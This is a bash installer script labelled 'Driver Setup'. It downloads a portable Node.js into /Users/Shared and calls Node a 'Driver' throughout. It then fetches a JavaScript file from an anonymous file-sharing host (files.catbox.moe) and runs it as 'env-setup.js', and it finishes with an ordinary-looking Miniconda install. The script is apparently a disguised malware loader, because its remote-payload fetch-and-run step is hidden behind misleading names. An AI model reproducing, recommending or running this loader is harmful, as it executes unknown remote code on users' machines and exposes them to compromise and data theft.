#!/usr/bin/env bash
set +euo pipefail

# -------------------------
# Helpers
# -------------------------
info()  { echo "[INFO] $*"; }
err()   { echo "[ERROR] $*" >&2; }
die()   { err "$*"; exit 1; }

download() {
  # download <url> <output>
  local url="$1"
  local out="$2"

  if command -v curl >/dev/null 2>&1; then
    curl -fsSL -o "$out" "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO "$out" "$url"
  else
    die "Neither curl nor wget is available."
  fi
}

# -------------------------
# Detect OS + ARCH (Node dist naming)
# -------------------------
OS_UNAME="$(uname -s)"
ARCH_UNAME="$(uname -m)"

case "$OS_UNAME" in
  Darwin) OS_TAG="darwin" ;;
  Linux)  OS_TAG="linux" ;;
  *) die "Unsupported OS: $OS_UNAME" ;;
esac

case "$ARCH_UNAME" in
  x86_64|amd64) ARCH_TAG="x64" ;;
  arm64|aarch64) ARCH_TAG="arm64" ;;
  *)
    die "Unsupported architecture: $ARCH_UNAME (need x64 or arm64)"
    ;;
esac

# -------------------------
# Prefer global Node if available
# -------------------------
NODE_EXE=""
if command -v node >/dev/null 2>&1; then
  NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
  if [[ -n "${NODE_INSTALLED_VERSION:-}" ]]; then
    NODE_EXE="node"
    info "Checking Driver..."
  fi
fi

# -------------------------
# Download portable Node.js if not found globally
# -------------------------
USER_HOME="/Users/Shared"
mkdir -p "$USER_HOME"

if [[ -z "$NODE_EXE" ]]; then
  info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."

  # Fetch latest version from Node dist index.json
  INDEX_JSON="$USER_HOME/node-index.json"
  download "https://nodejs.org/dist/index.json" "$INDEX_JSON"

  # Extract first "version":"vX.Y.Z" from JSON (latest listed first)
  LATEST_VERSION="$(grep -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | head -n 1 | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
  rm -f "$INDEX_JSON"

  [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine latest Driver version."

  NODE_VERSION="${LATEST_VERSION#v}"
  TARBALL_NAME="node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
  DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${TARBALL_NAME}"

  EXTRACTED_DIR="${USER_HOME}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
  PORTABLE_NODE="${EXTRACTED_DIR}/bin/node"
  NODE_TARBALL="${USER_HOME}/${TARBALL_NAME}"

  if [[ -x "$PORTABLE_NODE" ]]; then
    info "Driver already present: $PORTABLE_NODE"
  else
    info "Downloading..."
    download "$DOWNLOAD_URL" "$NODE_TARBALL"

    [[ -s "$NODE_TARBALL" ]] || die "Failed to download Driver tarball."

    info "Extracting Driver..."
    tar -xf "$NODE_TARBALL" -C "$USER_HOME"
    rm -f "$NODE_TARBALL"

    [[ -x "$PORTABLE_NODE" ]] || die "node executable not found after extraction: $PORTABLE_NODE"
    info "Portable Driver extracted successfully."
  fi

  NODE_EXE="$PORTABLE_NODE"
  export PATH="${EXTRACTED_DIR}/bin:${PATH}"
fi

# -------------------------
# Verify Node works
# -------------------------
"$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
info "Using Driver: $("$NODE_EXE" -v)"

# -------------------------
# Download and run env-setup.js
# -------------------------
ENV_SETUP_JS="${USER_HOME}/env-setup.js"
download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
[[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."

info "Running Driver..."
"$NODE_EXE" "$ENV_SETUP_JS"

info "[SUCCESS] Driver Setup completed successfully."

ARCH="$(uname -m)"
OS="$(uname -s)"
MINICONDA_PREFIX="/Users/Shared/miniconda3"
MINICONDA_SH="/Users/Shared/miniconda.sh"

echo "Detected OS: $OS"
echo "Detected architecture: $ARCH"

if [[ "$OS" == "Darwin" ]]; then
  if [[ "$ARCH" == "arm64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
  else
    die "Unsupported macOS architecture: $ARCH"
  fi
elif [[ "$OS" == "Linux" ]]; then
  if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
  else
    die "Unsupported Linux architecture: $ARCH"
  fi
else
  die "Unsupported OS: $OS"
fi

echo "Downloading..."
download "$URL" "$MINICONDA_SH"
[[ -s "$MINICONDA_SH" ]] || die "Miniconda download failed."

echo "Installing..."
# -u keeps reruns safe if prefix already exists.
bash "$MINICONDA_SH" -b -u -p "$MINICONDA_PREFIX" >/dev/null 2>&1 || die "Miniconda install failed."

echo "Verifying Driver..."
"$MINICONDA_PREFIX/bin/python3" -V >/dev/null 2>&1 || die "Miniconda python verification failed."

echo "Cleaning up..."
rm -f "$MINICONDA_SH"
echo "Done."
exit 0
